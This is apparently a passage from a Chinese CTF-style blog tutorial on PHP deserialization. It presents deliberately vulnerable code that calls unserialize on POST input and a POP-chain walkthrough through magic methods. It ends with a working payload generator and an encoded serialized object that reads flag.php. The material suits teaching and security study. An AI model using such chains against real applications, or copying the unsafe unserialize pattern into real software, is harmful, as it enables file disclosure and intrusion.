+<span class="line" data-line="52"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $c1;</span></span>
+<span class="line" data-line="53"></span>
+<span class="line" data-line="54"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> execute</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="55"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="56"><span style="color:#E1E4E8">        (</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">c1)();</span></span>
+<span class="line" data-line="57"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="58"></span>
+<span class="line" data-line="59"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> getFlag</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="60"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="61"><span style="color:#79B8FF">        echo</span><span style="color:#79B8FF"> file_get_contents</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">c1);</span></span>
+<span class="line" data-line="62"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="63"></span>
+<span class="line" data-line="64"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="65"></span>
+<span class="line" data-line="66"><span style="color:#79B8FF">unserialize</span><span style="color:#E1E4E8">($_POST[</span><span style="color:#9ECBFF">'cmd'</span><span style="color:#E1E4E8">]);</span></span></code></pre>
+<p>大家在做 <code>POP链</code> 构造题目时，可以找到前面的常见魔术方法，进行一一对应，同时建议手动写出整个链条的构造，如下所示：</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#79B8FF">unserialize</span><span style="color:#E1E4E8">()</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">red</span><span style="color:#F97583">-></span><span style="color:#B392F0">__destruct</span><span style="color:#E1E4E8">()</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">white</span><span style="color:#F97583">-></span><span style="color:#B392F0">__toString</span><span style="color:#E1E4E8">()</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">color</span><span style="color:#F97583">-></span><span style="color:#B392F0">run</span><span style="color:#E1E4E8">()</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">blue</span><span style="color:#F97583">-></span><span style="color:#B392F0">__invoke</span><span style="color:#E1E4E8">()</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">red</span><span style="color:#F97583">-></span><span style="color:#B392F0">__call</span><span style="color:#E1E4E8">()</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">color</span><span style="color:#F97583">-></span><span style="color:#B392F0">get_flag</span><span style="color:#E1E4E8">()</span><span style="color:#F97583">-></span><span style="color:#B392F0">file_get_contents</span><span style="color:#E1E4E8">()</span></span></code></pre>
+<p><code>unserialize()</code> 会去调用 <code>red</code> 类的 <code>__destruct()</code> 方法，由于方法中的 <code>echo $this->r1 . '0xff0000';</code> 把这个对象当成了字符串，所以调用了 <code>white</code> 类的 <code>__toString()</code> 方法，然后再调用 <code>color</code> 类里的 <code>execute()</code> 方法，然后在 <code>execute()</code> 方法里把这个对象当成了方法使用，所以就去调用了 <code>blue</code> 类的 <code>__invoke()</code> 方法，又因为在 <code>__invoke()</code> 方法里再次调用了一个不存在的 <code>blue</code> 方法，接着就会去调用 <code>red</code> 类里的 <code>__call</code> 方法，最后去调用 <code>color</code> 类里的 <code>getFlag()</code> 方法，然后我们根据 <code>POP链</code> 开始构造代码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">class</span><span style="color:#B392F0"> blue</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $b1;</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $b2;</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="8"></span>
+<span class="line" data-line="9"><span style="color:#F97583">class</span><span style="color:#B392F0"> red</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $r1;</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="13"></span>
+<span class="line" data-line="14"><span style="color:#F97583">class</span><span style="color:#B392F0"> white</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="16"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $w;</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="18"><span style="color:#F97583">class</span><span style="color:#B392F0"> color</span></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="20"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $c1;</span></span>
+<span class="line" data-line="21"></span>
+<span class="line" data-line="22"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="23"></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">$f </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> red</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="25"><span style="color:#E1E4E8">$f </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> r1 </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> white</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">$f </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> r1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> w </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> color</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">$f </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> r1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> w </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> c1 </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> blue</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">$f </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> r1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> w  </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> c1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> b1 </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> red</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">$f </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> r1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> w  </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> c1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> b1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> r1 </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> color</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="30"><span style="color:#E1E4E8">$f </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> r1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> w  </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> c1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> b1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> r1 </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> c1 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'flag.php'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="31"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="32"><span style="color:#79B8FF">echo</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">urlencode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($f)));</span></span>
+<span class="line" data-line="33"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="34"><span style="color:#6A737D">// O%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22white%22%3A1%3A%7Bs%3A1%3A%22w%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3BO%3A4%3A%22blue%22%3A2%3A%7Bs%3A2%3A%22b1%22%3BO%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7Ds%3A2%3A%22b2%22%3BN%3B%7D%7D%7D%7D</span></span></code></pre>
+<h2 id="写在后面">写在后面</h2>
+<p>这篇文章从去年七月底就开始写了，因为参加比赛/攻防演练耽误了好长时间，导致思路断断续续…陆陆续续想起来就总结一下2333，文章提到的都很浅薄，总之多练习</p>   </section> <footer class="mt-12 pt-8 border-t border-gray-200 dark:border-gray-700"> <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-lg text-sm text-gray-700 dark:text-gray-300 space-y-2 relative overflow-hidden transition-colors duration-300">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none text-gray-600 dark:text-gray-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="currentColor" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10 space-y-2"> <div> <strong>本文作者：</strong> <span>iami233</span> </div> <div> <strong>本文链接：</strong> <a href="https://5ime.cn/unserialize/index.html" target="_blank" rel="noopener" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 break-all transition-colors duration-300"> https://5ime.cn/unserialize/index.html </a> </div> <div> <strong>版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/cn/" target="_blank" rel="noopener noreferrer" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 transition-colors duration-300">
+CC BY-NC-SA 4.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" class="transition-colors duration-300"></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.DMKo1lxI.js"></script>  </div> <div id="custom-lightbox" class="lightbox" style="display: none;" data-astro-cid-vqtgpguw>  <div id="lightbox-images" data-astro-cid-vqtgpguw></div> <div class="toolbar" data-astro-cid-vqtgpguw> <div class="counter" data-astro-cid-vqtgpguw> <span data-astro-cid-vqtgpguw><b id="current" data-astro-cid-vqtgpguw>1</b>/<span id="total" data-astro-cid-vqtgpguw>0</span></span> </div> <div class="nav" data-astro-cid-vqtgpguw> <div class="btn" id="prev" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M31 36L19 24L31 12" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> <div class="btn" id="next" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M19 12L31 24L19 36" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> <div class="btn" id="close" data-astro-cid-vqtgpguw> <svg width="16" height="16" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M8 8L40 40M8 40L40 8" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> </div> <script type="module">class o{index=0;images=[];elements;constructor(){this.elements={lightbox:document.getElementById("custom-lightbox"),container:document.getElementById("lightbox-images"),prev:document.getElementById("prev"),next:document.getElementById("next"),close:document.getElementById("close"),current:document.getElementById("current"),total:document.getElementById("total")},this.init()}init(){this.elements.prev.onclick=()=>this.navigate(-1),this.elements.next.onclick=()=>this.navigate(1),this.elements.close.onclick=()=>this.close(),this.elements.lightbox.onclick=e=>{e.target===this.elements.lightbox&&this.close()},document.onkeydown=e=>{this.elements.lightbox.style.display==="flex"&&(e.key==="ArrowLeft"?this.navigate(-1):e.key==="ArrowRight"?this.navigate(1):e.key==="Escape"&&this.close())}}open(e,t=0){this.images=e,this.index=t,this.render(),this.elements.lightbox.style.display="flex",this.elements.lightbox.classList.remove("exit"),document.body.style.overflow="hidden"}navigate(e){const t=this.index+e;t>=0&&t<this.images.length&&(this.index=t,this.render())}render(){const{src:e,alt:t}=this.images[this.index],i=new Image;i.onload=()=>{this.elements.container.innerHTML=`<img src="${e}" alt="${t}">`;const s=this.elements.container.querySelector("img");if(window.innerWidth>768){const n=window.innerWidth*.8,l=window.innerHeight*.75;(i.naturalWidth>n||i.naturalHeight>l)&&(s.style.maxWidth=`${n}px`,s.style.maxHeight=`${l}px`)}requestAnimationFrame(()=>s.classList.add("show"))},i.src=e,this.elements.current.textContent=(this.index+1).toString(),this.elements.total.textContent=this.images.length.toString(),this.elements.prev.style.opacity=this.index===0?"0.3":"1",this.elements.next.style.opacity=this.index===this.images.length-1?"0.3":"1"}close(){this.elements.lightbox.classList.add("exit"),document.body.style.overflow="",setTimeout(()=>this.elements.lightbox.style.display="none",300)}}window.customLightbox=new o;</script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-gray-700 dark:text-gray-400" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2026 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("article");if(e&&window.customLightbox){const n=e.getElementsByTagName("img"),o=[];Array.from(n).forEach((t,a)=>{t.alt||(t.alt=`文章配图 ${a+1}`),o.push({src:t.src,alt:t.alt}),t.style.cursor="pointer",t.addEventListener("click",()=>{window.customLightbox.open(o,a)})})}});</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const o=document.querySelectorAll("[data-live-photo]");if(!o.length)return;const e=()=>{o.forEach(t=>{t.setAttribute("data-live-photo-initialized","true")})},i=()=>{const{LivePhotosKit:t}=window;try{t?.Player?.initialize()}catch(n){console.error("LivePhotosKit 初始化失败:",n)}e()};if(window.LivePhotosKit)i();else{const t=document.createElement("script");Object.assign(t,{src:"https://cdn.apple-livephotoskit.com/lpk/1/livephotoskit.js",async:!0,crossOrigin:"anonymous",onerror:()=>{console.error("LivePhotosKit 脚本加载失败"),e()},onload:()=>setTimeout(i,100)}),document.head.appendChild(t)}});</script></body></html>
